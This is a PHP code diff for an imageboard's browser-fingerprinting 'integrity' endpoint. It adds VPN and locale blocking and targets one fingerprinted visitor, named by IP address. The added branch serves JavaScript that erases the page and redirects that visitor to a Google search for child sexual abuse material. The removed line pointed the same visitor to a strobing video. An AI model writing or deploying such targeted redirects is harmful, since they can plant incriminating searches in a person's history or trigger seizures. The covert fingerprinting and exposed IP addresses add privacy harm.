@@ -1,19 +1,46 @@
 <?php
 include_once "inc/bootstrap.php";
+include_once "proxycheck.io.php.function.php";
 
 if (isset($_POST['integrity-v2'])) {
 	$decryptedData = decrypt_integrity($_POST['integrity-v2']);
 	if (is_array($decryptedData)) {
 		insert_integrity($decryptedData);
 
+		$redis = new Redis();
+		$redis->connect('127.0.0.1', 6379);
+
+		$hash = get_integrity_hash($decryptedData);
+
+		$redis->set("sharty:integrity_pinged_" . $hash . md5($_SERVER['REMOTE_ADDR']), true, 60*60*24);
+
+		$isVPN = vpn_check($_SERVER["REMOTE_ADDR"], false);
 		if (
-			$decryptedData['ti'] == "92.41.158.32"
+			$isVPN &&
+			in_array($decryptedData['loc'], $config['blocked_locales']) &&
+			!isset($_COOKIE['pass']) &&
+			!str_contains($_SERVER['HTTP_REFERER'], '/pass.php')
+		) {
+			http_response_code(234);
+			header("Content-Type: application/javascript; charset=utf-8");
+			echo "document.body.remove(); location = \"https://soybooru.com\";";
+		}
+
+		// polackbowl (CP SPAMMER)
+		if (
+			($decryptedData['arch'] == 255 &&
+			$decryptedData['ww'] == 1280 &&
+			$decryptedData['wh'] == 984 &&
+			$decryptedData['dpr'] == 1 &&
+			$decryptedData['tz'] == -120 &&
+			$decryptedData['ur'] == 'ANGLE (NVIDIA, NVIDIA GeForce GTX 750 Ti (0x00001380) Direct3D11 vs_5_0 ps_5_0, D3D11)')
+			||
+			($_SERVER['REMOTE_ADDR'] == "217.97.61.93")
 		) {
 			error_log("ACK!");
 			http_response_code(234);
 			header("Content-Type: text/javascript; charset=utf-8");
-			echo "document.body.remove(); location = \"/strobingjeffthekiller.mp4\";";
+			echo "document.body.remove(); location = \"https://www.google.com/search?q=child+porn+free+download+poland\";";
 		}
 	}
 }
-
